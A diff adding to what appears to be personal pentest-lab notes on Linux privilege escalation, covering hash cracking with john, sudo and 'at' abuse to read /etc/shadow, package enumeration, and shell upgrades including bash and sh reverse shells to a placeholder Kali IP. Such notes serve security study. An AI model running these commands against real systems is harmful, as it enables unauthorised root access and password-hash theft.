@@ -31,6 +31,8 @@ cat /etc/shadow - contails passowrd hashes
 ```bash
 nano hash.txt
 john hash.txt
+# for the already cracked hashes
+john --show hash.txt
 ```
 check weather the /etc/password and /etc/shadow are having write permissions
 
@@ -62,3 +64,47 @@ kali-tweaks
 
 <img src="image-1.png" alt="alt text" width="400"/>
 <img src="image-2.png" alt="alt text" width="400"/>
+<img src="image-3.png" alt="alt text" width="400"/>
+- if you are able to see the ALL in the **sudo -l** then you can run any command with sudo
+````bash
+sudo -l
+````
+- if you are able to see the ALL in the **sudo -i** 
+````bash
+sudo -i
+````
+- if you see the **at**  try this
+```bash
+COMMAND="id > hi.txt"
+echo "$COMMAND" | at now
+cat hi.txt
+
+COMMAND="cat /etc/shadow > hi.txt"
+echo "$COMMAND" | at now
+cat hi.txt
+
+or you can try bellow command
+
+echo "whoami > hi.txt" | at now
+cat hi.txt
+
+```
+## Kernal Vulnerabilities and Application Vulnerabilities
+
+- To list all the packeges installed in the linux machine
+```bash
+apt list --installed
+dpkg --list
+dpkg -l
+dpkg -l | grep -v '^ii  lib'
+apt list --installed | grep -v '^lib'
+ls /usr/share/applications/
+```
+- If you don't have proper shell then try this command if it having python or bash or sh
+```bash
+python -c 'import pty; pty.spawn("/bin/bash");'
+bash -i >& /dev/tcp/<kali IP>/1234 0>&1
+sh -i >& /dev/tcp/<kali IP>/1234 0>&1
+```
+
+
